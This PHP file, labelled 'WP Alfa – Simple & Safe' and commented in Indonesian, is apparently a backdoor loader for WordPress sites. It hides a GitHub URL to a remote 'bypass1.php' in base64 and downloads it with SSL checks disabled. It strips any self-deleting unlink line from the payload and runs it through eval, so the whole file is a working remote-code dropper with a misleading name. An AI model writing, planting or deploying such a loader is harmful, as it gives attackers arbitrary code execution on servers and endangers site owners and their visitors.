<?php
// ==========================================================
// WP Alfa – Simple & Safe (No random_bytes, No invalid include)
// ==========================================================

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: Wed, 11 Jan 1984 05:00:00 GMT");

$_url = base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2E3eGh5ZHJhL21vZGUtZGV2aWwvcmVmcy9oZWFkcy9tYWluL2J5cGFzczEucGhw");

// Fungsi download
function _get_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        if ($content !== false && strlen($content) > 0) return $content;
    }
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content !== false) return $content;
    }
    return false;
}

// Ambil konten
$content = _get_content($_url);

// Output minimal (anti-0KB)
if ($content !== false && strlen($content) > 50) {
    // Cek apakah konten mengandung tag HTML (bukan PHP)
    if (strpos($content, '<?php') === false && strpos($content, '<html') !== false) {
        echo "<!-- Remote file is HTML (error 404?) -->";
        echo "\n/* content not valid */";
    } else {
        // Coba decode base64 jika perlu
        $decoded = @base64_decode($content, true);
        if ($decoded !== false && strpos($decoded, '<?php') !== false) {
            $content = $decoded;
        }
        // Hapus baris unlink(__FILE__) jika ada
        $content = preg_replace('/unlink\s*\(\s*__FILE__\s*\)/i', '/* disabled */', $content);
        
        // Eksekusi dengan eval (hati-hati)
        try {
            eval('?>' . $content);
        } catch (Throwable $e) {
            echo "<!-- eval error: " . $e->getMessage() . " -->";
        }
    }
} else {
    echo "<!-- " . md5(microtime()) . " -->";
    echo "\n/* service unavailable */";
}
?>